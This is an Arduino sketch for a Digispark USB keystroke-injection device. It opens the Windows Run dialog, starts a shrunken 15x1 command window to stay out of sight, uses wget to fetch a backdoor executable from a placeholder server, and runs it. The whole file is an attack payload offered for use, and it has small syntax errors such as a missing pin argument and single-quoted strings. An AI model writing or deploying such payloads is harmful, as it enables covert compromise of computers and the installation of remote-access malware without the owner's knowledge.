#include "DigiKeyboard.h"

void setup() {
}

void loop() {
	digitalWrite(HIGH); // Set port 1 to high logic level
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(600); // wait 600 thousandths
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Ctrl + R + left = open windows run
	DigiKeyboard.delay(600); // wait 600 thousandths
	DigiKeyboard.print('cmd') // type cmd
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(300); // wait 300 thousandths
	DigiKeyboard.print("MODE CON: COLS=15 LINES=1"); // reset cmd 15x1 window
	DigiKeyboard.delay(200); // wait 200 thousandths
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(400); // wait 400 thousandths
	DigiKeyboard.print('wget http://[backdoor_server]/name_backdoor.exe'); // download the backdoor
	DigiKeyboard.delay(300); // wait 300 thousandths
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(300); // wait 300 thousandths
	DigiKeyboard.print('start name_backdoor.exe'); // run the backdoor
	DigiKeyboard.sendKeyStroke(KEY_ENTER);// //enter/return
	digitalWrite(LOW); // Set the port to a low logic level
	
	for(;;) {

	}
	
}
